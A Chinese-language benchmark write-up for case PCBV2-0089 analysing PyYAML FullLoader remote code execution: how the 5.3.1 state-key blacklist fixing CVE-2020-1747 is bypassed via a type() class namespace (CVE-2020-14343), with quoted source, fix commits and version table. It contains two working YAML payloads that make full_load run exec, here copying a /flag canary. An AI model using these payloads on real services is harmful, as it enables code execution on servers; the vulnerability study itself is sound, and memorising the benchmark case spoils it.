# PyYAML 5.3.1：state 黑名单拦住了 `extend`，构造参数里的 `extend` 没人看

- Case：`PCBV2-0089`（`codeinj_pyyaml_fullloader`）
- 产品：PyYAML（`yaml.full_load` / `FullLoader`）。本 case 用官方 PyPI sdist `PyYAML==5.3` / `5.3.1` / `5.4`，Flask `POST /parse` 把请求体原样交给 `yaml.full_load`。
- 链：CVE-2020-1747（5.3 → 5.3.1，PR #386 / merge `5080ba5`）→ CVE-2020-14343（5.3.1 → 5.4，PR #472 / commit `a001f27`）
- 源码对着 GitHub tag `5.3.1` 与 `5.4` 的 `lib3/yaml/constructor.py`：`check_state_key`、`get_state_keys_blacklist`、`set_python_instance_state`、`construct_python_object_apply`、`construct_python_object_new`、`FullConstructor.add_multi_constructor`。运行时装的是发布包本身。

2020 年 3 月，PyYAML 5.3.1 给 FullLoader 的实例 **state** 加了一张键名黑名单：`extend` 和 `__.*__` 不许写进 `__dict__`。这挡住了「先 `!!python/object/new` 造一个对象，再用 `state: {extend: exec}` 把 `extend` 换成 `exec`，最后 `listitems` 触发 `instance.extend(...)`」这条经典链。四个月后 arxenix 在 issue #420 给出另一条 YAML：把带 `extend=exec` 的 **类命名空间** 当成 `type()` 的第三个参数。`check_state_key` 根本看不到它。NVD CVE-2020-14343 写明 *This flaw is due to an incomplete fix for CVE-2020-1747*。

根因不只是「黑名单漏了一项」。检查插在「往已有实例的 state 里写键」这一层；真正把 `extend` 变成可调用对象的，还可以是 `type(name, bases, dict)` 的第三个映射。黑名单只挂在 `set_python_instance_state` 上。`python/object/new` 这个多构造器在 5.3 和 5.3.1 的 FullConstructor 表里完全一样。下面按 `full_load` 走进去、5.3.1 改了哪几行、state 之后谁调用 `extend`、更强的「把 python/object 标签挪走」有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

`yaml.full_load` 是 5.1 之后推荐的「比 `load` 安全一点」的入口。它用 `FullLoader`：能还原 Python 标量、tuple、以及一部分 `!!python/object/*` 标签，但官方 wiki 当时写过 *Avoids arbitrary code execution*。很多应用把用户 YAML（配置上传、API body）直接丢给它。

本 case 的服务就是这种用法：

```http
POST /parse
Content-Type: application/x-yaml

<YAML body>
```

```python
# app.py :: parse
data = yaml.full_load(request.data)   # 真实、未改过的 FullLoader
```

设计意图：文档是配置，不是代码。成功穿越之后的效果是：**FullLoader 在 load 期间执行了用户 YAML 指定的 Python 调用**。本 case 把这次调用收成一次良性读：把容器里 `/flag` 的金丝雀拷到 `/out/leak.txt`，`/parse` 再把 leak 读进 JSON。flag 不在 YAML 里，也不在 Flask 代码里。

数据流：

```text
HTTP body (YAML)
    → yaml.full_load
         FullLoader 解析 tag
         python/object/new  → construct_python_object_new
              → construct_python_object_apply
                   make_python_instance(suffix, args, kwds)   ← 用 args 调 cls.__new__ / type()
                   set_python_instance_state(instance, state) ← V1 黑名单插在这里
                   instance.extend(listitems)                 ← 真正的 sink
    → 若 extend 已被换成 exec：执行 listitems 字符串
    → /out/leak.txt → JSON leaked
```

没有登录。判断完全信任 FullLoader「不会跑任意代码」。

---

## 原始漏洞：通过 state 把 `extend` 换成 `exec`（CVE-2020-1747，5.3）

5.3 的 `construct_python_object_apply` 在造完实例之后，无条件把 YAML 里的 `state:` 写进实例，再如果有 `listitems:` 就调用 `instance.extend`：

```python
# lib3/yaml/constructor.py :: construct_python_object_apply  （5.3 / 5.3.1 结构相同）
        instance = self.make_python_instance(suffix, node, args, kwds, newobj)
        if state:
            self.set_python_instance_state(instance, state)
        if listitems:
            instance.extend(listitems)
```

5.3 的 `set_python_instance_state` **没有** `check_state_key`。只要载体对象有可写 `__dict__`、没有 `__setstate__`，`state: {extend: !!python/name:builtins.exec}` 就会把实例上的 `extend` 换成 builtin `exec`。随后 `instance.extend(listitems)` 变成 `exec(<code>)`。

PR #386 的说明写的就是这件事：*it is possible for an attacker to set the instance' state in such a way that arbitrary code is executed by the FullLoader*。

本 case 的 seed 用 `_frozen_importlib.ModuleSpec` 当载体（解释器里一定有、可写 `__dict__`）：

```yaml
!!python/object/new:_frozen_importlib.ModuleSpec
state:
  extend: !!python/name:builtins.exec
listitems: "open('/out/leak.txt','w').write(open('/flag').read())"
```

5.3 上 `full_load` 跑完，`/parse` 的 JSON `leaked` 里出现 `PCBFLAG_...`。这就是 v0 + `--seed` 退出码 0。

---

## 维护者改了什么（CVE-2020-1747 修复，5.3.1）

PR #386 / merge `5080ba513377b6355a0502104846ee804656f1e0` 没有拿掉 `python/object/new`。它只在 FullConstructor 上加了一张 **state 键名** 黑名单，并让 `set_python_instance_state` 在写 `__dict__` / `setattr` 之前调用 `check_state_key`。tag `5.3.1`：

```python
# lib3/yaml/constructor.py  (PyYAML 5.3.1)
    def check_state_key(self, key):
        """Block special attributes/methods from being set in a newly created
        object, to prevent user-controlled methods from being called during
        deserialization"""
        if self.get_state_keys_blacklist_regexp().match(key):
            raise ConstructorError(None, None,
                "blacklisted key '%s' in instance state found" % (key,), None)

class FullConstructor(SafeConstructor):
    # 'extend' is blacklisted because it is used by
    # construct_python_object_apply to add `listitems` to a newly generate
    # python instance
    def get_state_keys_blacklist(self):
        return ['^extend$', '^__.*__$']
```

`set_python_instance_state` 里真正消费这张表的位置：

```python
# lib3/yaml/constructor.py :: set_python_instance_state  (5.3.1)
        if hasattr(instance, '__dict__'):
            if not unsafe and state:
                for key in state.keys():
                    self.check_state_key(key)
            instance.__dict__.update(state)
        ...
            for key, value in slotstate.items():
                if not unsafe:
                    self.check_state_key(key)
                setattr(instance, key, value)
```

`unsafe=True` 时跳过检查（UnsafeConstructor 走这条）。FullLoader 默认 `unsafe=False`。

对 seed 这种「毒在 `state:` 里」的写法，它确实够用：`check_state_key('extend')` 命中 `^extend$`，抛 `ConstructorError: blacklisted key 'extend' in instance state found`，`listitems` 那一行到不了。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险属性只会通过 **state 映射的键名** 进来。
2. 挡住 `extend` 和 dunder 之后，`python/object/new` 剩下的能力不再能把可调用对象装到 `extend` 上。

第二点不成立。`construct_python_object_apply` 在调 `set_python_instance_state` **之前** 已经用 YAML 的 `args:` 调用了 `cls.__new__(cls, *args)`。`type` 的第三个参数是类字典，键名从来不会经过 `check_state_key`。

---

## 检查之后谁真正消费那个值

黑名单看完，同一个函数继续往下走。`listitems` 不经过任何键名检查：

```python
# lib3/yaml/constructor.py :: construct_python_object_apply  (5.3.1，约 L648–656)
        instance = self.make_python_instance(suffix, node, args, kwds, newobj)
        if state:
            self.set_python_instance_state(instance, state)
        if listitems:
            instance.extend(listitems)
        if dictitems:
            for key in dictitems:
                instance[key] = dictitems[key]
```

`instance.extend` 解析的是 **实例上此刻叫 `extend` 的那个属性**，不是 YAML 键名 `extend`。谁先把这个属性设成 `exec`，谁就能让 `listitems` 变成一次 `exec`。

`make_python_instance` 在 `newobj=True`（也就是 `python/object/new`）时：

```python
# lib3/yaml/constructor.py :: make_python_instance  (5.3.1)
        cls = self.find_python_name(suffix, node.start_mark)
        ...
        if newobj and isinstance(cls, type):
            return cls.__new__(cls, *args, **kwds)
        else:
            return cls(*args, **kwds)
```

`suffix` 是 tag 后面的名字。`!!python/object/new:type` 时 `cls` 就是 builtin `type`。`type.__new__(type, name, bases, namespace)` 会造出一个 **新类**，第三个参数里的键直接成为类属性。这里没有 `check_state_key`。

`python/name:builtins.exec` 在 5.3.1 的 FullConstructor 里仍然注册着（`construct_python_name`），可以解析成真正的 `exec` 函数对象。

所以消费链是：

| 阶段 | 谁读用户数据 | 5.3.1 有没有黑名单 |
|---|---|---|
| `args:` → `type.__new__` | 类字典键 | **无** |
| `state:` → `__dict__.update` | state 键 | 有 `check_state_key` |
| `listitems:` → `instance.extend` | 已装好的属性 | 无（假定 extend 还是 list.extend） |

过滤器刚看过的是 state 的键名；`extend(listitems)` 看到的是对象上的属性。两套语义中间没有第二次谓词。

---

## 仓库里已经有更强的处理，FullLoader 没用上

同一份 `constructor.py` 里，`python/object/apply` 在 5.3 就已经只挂在 `UnsafeConstructor` 上（PR #347）。5.3.1 的注册表是：

```python
# 5.3.1 FullConstructor 仍有：
FullConstructor.add_multi_constructor(
    'tag:yaml.org,2002:python/object/new:',
    FullConstructor.construct_python_object_new)

# UnsafeConstructor 另有：
UnsafeConstructor.add_multi_constructor(
    'tag:yaml.org,2002:python/object/apply:',
    UnsafeConstructor.construct_python_object_apply)
```

也就是说维护者已经知道「apply 太危险，只能给 UnsafeLoader」。他们却把 **同一套** `construct_python_object_apply`（`newobj=True` 时就是 `python/object/new`）留在 FullLoader 上，只加了一层 state 键黑名单。

`find_python_name` 在 FullLoader 里仍然能解析任意已导入模块的属性（`builtins.exec`、`type`）。没有「只允许安全类型」的白名单。更完整的闭合方式——把 `python/module`、`python/object`、`python/object/new` 从 FullConstructor 挪走——要到 5.4 的 `a001f27` 才做。5.3.1 的 diff 里看不到那一步。

Riccardo Schirone（#386 作者）在 issue #420 里自己也写了：*a blacklist approach like the one I implemented in #386 is just too hard to maintain*。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「state 键名 vs 构造参数」落到具体 YAML：

- `check_state_key`：看 `state:` 映射里有没有键叫 `extend` 或匹配 `__.*__`
- `type.__new__`：把第三个参数的键直接变成类属性，不经过那张表
- `instance.extend(listitems)`：调用名字叫 `extend` 的属性，不管它是从哪来的

只要构造一种输入，使 `extend` **不出现在 state 键里**，却仍然成为实例（或类）上的 `extend`，第一层会放行，第三层仍然 `exec`。

issue #420 的第二条 payload 就是这样来的（本 case residual 同源）：

```yaml
!!python/object/new:type
args:
- z
- !!python/tuple []
- extend: !!python/name:builtins.exec
listitems: "open('/out/leak.txt','w').write(open('/flag').read())"
```

逐步发生的事：

```text
tag python/object/new:type
    → construct_python_object_new
    → construct_python_object_apply(newobj=True)
         args = ["z", (), {"extend": exec}]
         state = {}          ← 空，check_state_key 一次都不跑
         listitems = "<code>"
         make_python_instance("type", args)
              type.__new__(type, "z", (), {"extend": exec})
              → 新类 z，z.extend is exec
         没有 state，跳过 set_python_instance_state
         instance.extend(listitems)
              → exec("<code>")
```

`extend` 作为 **类字典的键** 进来，不是 state 的键。黑名单注释写「因为 construct_python_object_apply 会调 extend」，却只封了 state 这条供给路径。

seed 被挡住只说明「不能再从 state 里写 `extend`」，不说明「不能再让 `instance.extend` 变成 `exec`」。

---

## 残余仍然走同一条 FullLoader 对象逃逸（CVE-2020-14343）

没有换 endpoint、没有换 loader、没有换 `listitems` 触发的那一次调用。还是：

```http
POST /parse
```

body 仍是 `!!python/object/new` + `listitems`。V1 的 `check_state_key` 照样存在；只是这条 YAML 的 `state` 为空，它无事可做。`type(...)` 造出的类带着 `extend=exec`，`construct_python_object_apply` 末尾仍然 `instance.extend(listitems)`，良性 reader 把 `/flag` 拷到 `/out/leak.txt`，JSON 里出现 `PCBFLAG_...`。

认证：v1 + `--residual` 退出码 0，`/parse` body 中观察到 flag。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：黑名单只认 state 键名；`python/object/new` 的构造参数从未检查；`listitems` 无条件调用 `extend`。NVD 原话：*This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.*

issue #420 还给出了 `!!python/object/new:tuple` + `map` + `eval`、以及 `staticmethod` + `state.update=exec` 等其它绕过。本 case 的 heldout 固定用 `type` + tuple + 类字典这一条，因为它和 seed 共用 `extend(listitems)` 这一下。

---

## 后来又补了什么（CVE-2020-14343，5.4）

commit `a001f2782501ad2d24986959f0239a354675f9dc`（PR #472）把 `python/module`、`python/object`、`python/object/new` 从 FullConstructor **挪到** UnsafeConstructor。tag `5.4` 的注册表变成：

```python
# lib3/yaml/constructor.py  (PyYAML 5.4)
# FullConstructor 不再注册 python/module、python/object、python/object/new

UnsafeConstructor.add_multi_constructor(
    'tag:yaml.org,2002:python/module:',
    UnsafeConstructor.construct_python_module)

UnsafeConstructor.add_multi_constructor(
    'tag:yaml.org,2002:python/object:',
    UnsafeConstructor.construct_python_object)

UnsafeConstructor.add_multi_constructor(
    'tag:yaml.org,2002:python/object/new:',
    UnsafeConstructor.construct_python_object_new)
```

`yaml.full_load` 用的是 FullLoader。残余 YAML 的 tag `python/object/new:type` 在 FullConstructor 上找不到构造器，抛 `ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/new:type'`。seed 的 `python/object/new:_frozen_importlib.ModuleSpec` 同样找不到。CHANGES 写：*YAML that uses these tags must be loaded by UnsafeLoader*。

即便如此，`python/name:` 仍在 FullLoader 上；只是没有 `object/new` 之后，单靠 `!!python/name:exec` 不会在 load 时被调用。本 benchmark 的 v2 关闭的是这条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「往实例 state 里写哪些键」。真正执行用户代码的是 `instance.extend(listitems)`，而 `extend` 还可以在 `make_python_instance` 里被装上。V2 才把整张 `python/object/new` 标签从 FullLoader 拿掉。

**不是没有更强的处理。**  
`python/object/apply` 已经只给 UnsafeLoader。把 `python/object/new` 同样挪走，是 5.4 实际做的事。5.3.1 选择继续维护一张键名黑名单。

**同一函数、同一 `listitems` 触发点，只换了 `extend` 的供给路径。**  
seed 走 state，residual 走 `type()` 的 namespace。`construct_python_object_apply` 末尾那一行没有变。

**FullLoader 被宣传成「避免任意代码执行」。**  
issue #420 指出 wiki 的 *Avoids arbitrary code execution* 和 5.3.1 的实际能力不符。黑名单让人以为对象逃逸已经关上。

**金丝雀在树外是有意的。**  
`/flag` 不在应用目录。能读到它，说明 `exec` 在 `full_load` 期间真的跑了，而不是 JSON 回显了 YAML 原文。

---

## 版本、入口、参考

| | 版本 | FullConstructor 上的 `python/object/new` | state 黑名单 | seed（state.extend） | residual（type 类字典.extend） |
|---|---|---|---|---|---|
| V0 | 5.3 | 有 | 无 | `exec` 跑，JSON 含 flag | （不必） |
| V1 | 5.3.1 | **仍有** | `^extend$` / `^__.*__$` | `ConstructorError: blacklisted key 'extend'` | `exec` 跑，JSON 含 flag |
| V2 | 5.4 | 已挪到 UnsafeConstructor | （仍在，但 new 标签已不在 FullLoader） | 无构造器 | 无构造器 |

- Web：`POST /parse`，body 为 YAML，sink 为 `yaml.full_load`
- 认证：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到；v2 residual 未观察到
- [CVE-2020-1747](https://nvd.nist.gov/vuln/detail/CVE-2020-1747)、[CVE-2020-14343](https://nvd.nist.gov/vuln/detail/CVE-2020-14343)
- [PR #386](https://github.com/yaml/pyyaml/pull/386)（5.3.1，merge `5080ba5`）、[PR #472](https://github.com/yaml/pyyaml/pull/472) / [commit a001f27](https://github.com/yaml/pyyaml/commit/a001f2782501ad2d24986959f0239a354675f9dc)
- [issue #420](https://github.com/yaml/pyyaml/issues/420)（含 type-tuple-map residual 原文）
- [Red Hat 1860466](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-14343)（*incomplete fix for CVE-2020-1747*）
- V1 源码：[constructor.py @ 5.3.1](https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py)
